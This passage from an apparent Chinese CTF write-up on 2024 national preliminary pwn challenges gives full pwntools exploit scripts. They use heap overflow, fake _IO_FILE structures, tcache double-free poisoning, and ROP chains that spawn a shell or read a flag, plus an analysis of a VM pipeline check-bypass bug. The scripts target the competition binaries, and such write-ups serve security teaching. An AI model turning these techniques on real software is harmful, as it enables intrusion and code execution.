class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,title,author,isbn,date,price,stock</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Special Data: &#x27;</span>,encode32(protoencode(title,author,isbn,date,price,stock)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Keyword: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br><br><span class="hljs-comment">#p=remote(&#x27;8.147.131.163&#x27;,13015)</span><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>buy(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">12.1</span>,<span class="hljs-number">12</span>)<br>buy(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>see(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;ISBN: &#x27;</span>)<br>heap=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x05&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap&lt;&lt;<span class="hljs-number">12</span>))<br><br>buy(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>buy(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>buy(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>returnn(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x150</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>see(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x150</span>)<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x21ace0</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x510</span>),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># clean</span><br>buy(<span class="hljs-number">20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>buy(<span class="hljs-number">21</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>buy(<span class="hljs-number">22</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x150</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x150</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>buy(<span class="hljs-number">23</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x160</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><br>heap=heap&lt;&lt;<span class="hljs-number">12</span><br>gadget=libcbase+<span class="hljs-number">0x167420</span><br>setcontext=libcbase+<span class="hljs-number">0x53A1D</span><br>ret=libcbase+<span class="hljs-number">0x29139</span><br>rdi=<span class="hljs-number">0x2a3e5</span>+libcbase<br>rsi=libcbase+<span class="hljs-number">0x2be51</span><br>rdx_r12=libcbase+<span class="hljs-number">0x11f2e7</span><br>syscall=libcbase+<span class="hljs-number">0x1147e0</span><br>rax=libcbase+<span class="hljs-number">0x45eb0</span><br><br>fake_wide=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(heap+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x22c0</span>)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wide+=p64(heap+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x22c0</span>)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wide+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x68</span>+p64(gadget)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wide+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x20</span>+p64(setcontext)+p64(setcontext)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0x2a0</span>)+p64(heap+<span class="hljs-number">0x22c0</span>+<span class="hljs-number">0x310</span>)+p64(ret)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wide+=<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)+p64(rdi)+p64(heap+<span class="hljs-number">0x22c0</span>+<span class="hljs-number">0x300</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>fake_wide+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(heap)+p64(rdx_r12)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>fake_wide+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(heap)+p64(rdx_r12)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)+p64(rdi)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">0x3c</span>)+p64(syscall)<br>fake_wide=fake_wide.ljust(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>buy(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,fake_wide,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>stderr=libcbase+<span class="hljs-number">0x21b6a0</span><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64(stderr),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br>wfile_jump=libcbase+<span class="hljs-number">0x2170c0</span><br><br>fake_IO=p64((~(<span class="hljs-number">2</span>|<span class="hljs-number">0x8</span>|<span class="hljs-number">0x800</span>))&amp;<span class="hljs-number">0xffffffffffffffff</span>)+p64(heap+<span class="hljs-number">0x200</span>+<span class="hljs-number">0x22c0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">1</span>)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(heap+<span class="hljs-number">0x22c0</span>)+p64(heap+<span class="hljs-number">0x22c0</span>)+p64(ret)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>fake_IO=fake_IO.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO+=p64(wfile_jump)<br><br>edit(<span class="hljs-number">5</span>,fake_IO,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>quitt()<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ezbuf"><a href="#ezbuf" class="headerlink" title="ezbuf"></a>ezbuf</h1><p><em>经典再现之protobuf套壳堆</em></p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ul><li><p>有uaf无edit，add固定大小0x30，只有10次delete，3次泄漏后关闭stdout和stderr</p></li><li><p>高版本double free有板子可以套，<em>比赛的时候完全忘记了有这个浪费了很多时间</em></p><ul><li>大概就是在fastbin里造double free然后再放进tcache</li></ul></li><li><p>由于只有10次delete所以只能进行一次任意写，可以通过这一次任意写</p><ul><li>改 <strong>tcache bin</strong>，<em>这个刚想到了</em></li><li>通过不同大小的whatcon申请到相应大小的chunk，<em>这个没想到</em></li><li>还可以通过把tcache bin放进tcache bin里进行循环使用，<em>套套又娃娃</em></li></ul><p>这样就能把一次任意写变多次任意写</p></li><li><p>最后一次泄漏栈地址可以通过改stdout，少一次泄漏避免关闭输出的麻烦</p></li></ul><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><p><em>题外话：虽然这个沙箱没什么用，但再次看到这个沙箱倍感亲切（上次应该是ACTF），所以贴一下</em></p><img src="/2024/05/20/2024%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bpwn-wp/sandbox.png" class title="sandbox"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> heybro_pb2<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,con</span>):<br>    bro=heybro_pb2.Heybro()<br>    bro.whatcon=con<br>    bro.whattodo=<span class="hljs-number">1</span><br>    bro.whatidx=idx<br>    p.sendafter(<span class="hljs-string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,bro.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    bro=heybro_pb2.Heybro()<br>    bro.whattodo=<span class="hljs-number">2</span><br>    bro.whatidx=idx<br>    p.sendafter(<span class="hljs-string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,bro.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">idx,thiss,size,con</span>):<br>    bro=heybro_pb2.Heybro()<br>    bro.whattodo=<span class="hljs-number">3</span><br>    bro.whatidx=idx<br>    bro.whatthis=thiss<br>    bro.whatsize=size<br>    bro.whatcon=con<br>    p.sendafter(<span class="hljs-string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,bro.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    bro=heybro_pb2.Heybro()<br>    bro.whattodo=<span class="hljs-number">4</span><br>    p.sendafter(<span class="hljs-string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,bro.SerializeToString())<br><br><br><span class="hljs-comment">#p=remote(&#x27;8.147.129.121&#x27;,15268)</span><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>magic(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content:&#x27;</span>)<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x21ac61</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)<br><br>magic(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content:&#x27;</span>)<br>heap=u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))+<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>,p64(((heap&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x5000</span>+<span class="hljs-number">0xe0</span>)^heap))<br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>+p64(libcbase+<span class="hljs-number">0x21b780</span>-<span class="hljs-number">0x90</span>)+p64(<span class="hljs-number">0</span>)+p64(((heap&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x5000</span>+<span class="hljs-number">0xe0</span>)))<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x90</span>+p64(<span class="hljs-number">0xfbad1887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(libcbase+<span class="hljs-number">0x222200</span>)+p64(libcbase+<span class="hljs-number">0x222208</span>)<br>add(<span class="hljs-number">7</span>,payload)<br>stack=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>add(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0</span>)+p64(stack-<span class="hljs-number">0x168</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xd0</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>rdi=libcbase+<span class="hljs-number">0x2a3e5</span><br>bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>ret=libcbase+<span class="hljs-number">0x29139</span><br>rop=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>add(<span class="hljs-number">7</span>,rop.ljust(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="magic-vm"><a href="#magic-vm" class="headerlink" title="magic_vm"></a>magic_vm</h1><p>比赛的时候基本上逆完了，一眼没看出洞+解数较少没继续做，<em>感觉当时其实可以做一下的</em></p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p><em>一个延迟非常大的vm</em></p><p>主要数据结构作用</p><ul><li>vm_id：解析完的code，生成vm_id的过程中会对reg和address进行校验</li><li>vm_alu：指令执行</li><li>vm_mem：内存修改，如stack，reg和mem</li></ul><img src="/2024/05/20/2024%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bpwn-wp/run.png" class title="run"><p>vm::run的逻辑如下</p><ul><li>vm_alu::set_input：将上一轮解析完的vm_id填入vm_alu</li><li>vm_mem:set_input：将上一轮计算完的vm_alu填入vm_mem</li><li>vm_id::run：解析输入的code，进行一些检查，填入vm_id</li><li>vm_alu::run：对vm_alu进行计算</li><li>vm_mem::run：利用vm_mem进行内存更改</li></ul><p><em>为什么说它延迟大呢</em>，一轮vm::run中</p><ul><li><p>vm_alu计算的是上一轮解析的vm_id</p></li><li><p>当前指令导致的内存的更改需要</p><ul><li>一次vm_mem:set_input</li><li>一次vm_mem::run</li></ul><p>由于检查在vm_id中，所以</p><ul><li>指令执行和内存更改延迟一轮</li><li>合法性检查和内存更改延迟两轮</li></ul></li></ul><p>在进行的mem的更改时检查的是reg的内容，但保存的是reg的序号，所以以下操作：</p><table><thead><tr><th>轮次</th><th>vm_id</th><th>vm_alu</th><th>vm_mem</th></tr></thead><tbody><tr><td>1</td><td>解析更改reg为非法值的指令</td><td></td><td></td></tr><tr><td>2</td><td>解析nop指令</td><td>执行更改reg为非法值的指令</td><td></td></tr><tr><td>3</td><td>解析mem操作指令（reg此时为合法值，检查通过）</td><td>执行nop指令</td><td>reg更改生效</td></tr><tr><td>4</td><td></td><td>执行mem操作指令</td><td></td></tr><tr><td>5</td><td></td><td></td><td>mem操作生效</td></tr></tbody></table><p>可以在通过检查后更改reg为非法值</p><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><p><em>懒得写函数，直接复制粘贴了，真丑</em></p><ul><li>利用libgcc_s泄漏libc基址</li><li>利用libgcc_s泄漏vm的mem地址</li><li>_environ泄漏栈地址</li><li>利用栈上返回地址泄漏pie</li><li>更改vm的mem为stack</li><li>写rop链</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inst</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mem</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reg</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">args</span>(<span class="hljs-params">flag1,flag2,arg1,arg2</span>):<br>    var=(flag1|(flag2&lt;&lt;<span class="hljs-number">2</span>)).to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)+arg1.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-keyword">if</span> flag2==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> var+p64(arg2)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> var+arg2.to_bytes(<span class="hljs-number">1</span>,<span 